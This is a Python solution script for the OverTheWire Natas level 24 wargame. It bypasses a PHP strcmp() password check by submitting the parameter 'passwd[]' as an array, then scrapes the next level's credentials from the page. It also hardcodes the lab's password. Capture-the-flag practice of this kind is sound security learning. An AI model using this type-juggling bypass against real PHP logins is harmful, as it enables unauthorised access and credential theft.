# Abusing PHP strcmp() function

import re
import requests
import colorama
from colorama import Fore, Style


# Initialize colorama for colored console output
colorama.init(autoreset=False)
print(Fore.LIGHTBLUE_EX, Style.BRIGHT)

# Set the username and password for authentication
username = 'natas24'
password = '0xzF30T9Av8lgXhW7slhFCIsVKAPyl2r'

# Construct the URL using the given username
url = f'http://{username}.natas.labs.overthewire.org/'

# Create a session and set the authorization credentials
session = requests.Session()

# Set the authorization credentials using HTTP Basic Auth
session.auth = (username, password)

params = {"passwd[]": "11iloveyou", "submit": "whatever"}

# POST request with payload
resp = session.get(url, params=params)


print(f"Username: {re.search('Username: (.*) P', resp.text).group(1)}")
print(f"Password: {re.search('Password: (.*)</pre>', resp.text).group(1)}")
